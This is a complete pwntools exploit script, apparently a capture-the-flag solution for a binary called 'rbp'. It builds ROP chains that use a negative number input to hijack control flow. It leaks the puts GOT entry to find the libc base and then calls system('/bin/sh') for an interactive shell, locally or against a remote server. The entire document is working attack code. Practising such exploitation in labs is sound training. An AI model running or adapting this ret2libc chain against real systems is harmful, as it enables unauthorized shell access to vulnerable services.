from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *read_long+43
continue
'''.format(**locals())

exe = './challenge/rbp'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
p = start()

pop_rdi_ret     = 0x00000000004012b3
pop_rsi_r15_ret = 0x00000000004012b1
pop2_ret = 0x00000000004012b0

p.sendafter(b'name? ', flat(
    elf.sym.main,
    elf.plt.puts,
    elf.sym.main
))
p.sendafter(b'number? ', b'-40')

p.sendafter(b'name? ', flat(
    pop_rdi_ret,
    elf.got.puts,
    pop2_ret
))
p.sendafter(b'number? ', b'-40')

leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
info("Leak got puts: " + hex(leak))
libc.address = leak - libc.sym.puts

p.sendafter(b'name? ', flat(
    pop_rdi_ret,
    next(libc.search(b'/bin/sh\x00')),
    libc.sym.system
))
p.sendafter(b'number? ', b'-40')

p.interactive()
